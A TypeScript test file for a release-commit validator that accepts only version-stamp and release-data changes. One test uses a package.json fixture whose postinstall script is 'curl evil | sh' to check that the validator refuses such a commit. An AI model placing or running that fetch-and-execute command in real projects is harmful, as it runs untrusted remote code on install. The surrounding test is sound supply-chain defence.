// SPDX-License-Identifier: MPL-2.0
/**
 * release.yml runs the slim gate only for a commit that releaseCommitProblems
 * accepts, so every rule here guards the full test suite: a commit that
 * changes anything besides version stamps and regenerated release data must
 * be refused.
 */
import { describe, expect, it } from "bun:test";
import { releaseCommitProblems, releaseFileProblem } from "./release-commit.ts";

const V = "0.10.67";
// Main's stamp: release commits are cut from it.
const MAIN = "0.0.0";

const pkg = (version: string, extra: Record<string, unknown> = {}) =>
  `${JSON.stringify({ name: "@caelo-cms/shared", version, ...extra }, null, 2)}\n`;

describe("releaseFileProblem", () => {
  it("accepts a package.json whose only change is its version", () => {
    expect(
      releaseFileProblem({ path: "packages/shared/package.json", base: pkg(MAIN), head: pkg(V) }),
    ).toBeNull();
  });

  it("refuses a package.json that also changes a script or a dependency", () => {
    const head = pkg(V, { scripts: { postinstall: "curl evil | sh" } });
    expect(releaseFileProblem({ path: "package.json", base: pkg(MAIN), head })).toContain(
      "changes more than its version",
    );
  });

  it("accepts server.json with its nested package versions moved", () => {
    const at = (v: string) => JSON.stringify({ version: v, packages: [{ name: "x", version: v }] });
    expect(
      releaseFileProblem({ path: "packages/mcp-server/server.json", base: at(MAIN), head: at(V) }),
    ).toBeNull();
  });

  it("accepts lockfile workspace version lines and refuses any other lockfile line", () => {
    const lock = (v: string, zod: string) =>
      `{\n  "workspaces": {\n    "packages/shared": {\n      "name": "@caelo-cms/shared",\n      "version": "${v}",\n    },\n  },\n  "packages": {\n    "zod": ["zod@${zod}", "", {}, "sha512-x"],\n  },\n}\n`;
    expect(
      releaseFileProblem({ path: "bun.lock", base: lock(MAIN, "4.1.0"), head: lock(V, "4.1.0") }),
    ).toBeNull();
    expect(
      releaseFileProblem({ path: "bun.lock", base: lock(MAIN, "4.1.0"), head: lock(V, "4.2.0") }),
    ).toContain("changes more than its version stamp");
  });

  it("accepts version.ts with only CAELO_VERSION moved", () => {
    const src = (v: string, extra = "") => `export const CAELO_VERSION = "${v}";\n${extra}`;
    const path = "packages/shared/src/version.ts";
    expect(releaseFileProblem({ path, base: src(MAIN), head: src(V) })).toBeNull();
    expect(
      releaseFileProblem({ path, base: src(MAIN), head: src(V, "export const X = 1;\n") }),
    ).not.toBeNull();
  });

  it("accepts the regenerated release data with any content, added or changed", () => {
    for (const path of [
      "CHANGELOG.md",
      "release-meta.json",
      "packages/mcp-server/power-catalogue.json",
    ]) {
      expect(releaseFileProblem({ path, base: "a", head: "b" })).toBeNull();
      expect(releaseFileProblem({ path, base: null, head: "b" })).toBeNull();
    }
  });

  it("refuses the README: install links name no version, so the release never writes it", () => {
    expect(releaseFileProblem({ path: "README.md", base: "a", head: "b" })).toContain(
      "not a file the release script writes",
    );
  });

  it("refuses source files, other added files and deleted files", () => {
    expect(releaseFileProblem({ path: "scripts/release.ts", base: "a", head: "b" })).toContain(
      "not a file the release script writes",
    );
    expect(releaseFileProblem({ path: "package.json", base: null, head: "b" })).toContain("added");
    expect(releaseFileProblem({ path: "CHANGELOG.md", base: "a", head: null })).toContain(
      "deleted",
    );
  });
});

describe("releaseCommitProblems", () => {
  it("refuses an empty commit", () => {
    expect(releaseCommitProblems([], V)).toEqual(["the commit changes nothing"]);
  });

  it("refuses a commit still stamped with main's unreleased marker", () => {
    expect(releaseCommitProblems([{ path: "CHANGELOG.md", base: null, head: "b" }], MAIN)).toEqual([
      "the commit is stamped v0.0.0, the unreleased marker, not a release",
    ]);
  });

  it("lists every offending file", () => {
    const problems = releaseCommitProblems(
      [
        { path: "CHANGELOG.md", base: null, head: "b" },
        { path: "apps/admin/src/hooks.server.ts", base: "a", head: "b" },
      ],
      V,
    );
    expect(problems).toEqual([
      "apps/admin/src/hooks.server.ts: not a file the release script writes",
    ]);
  });
});
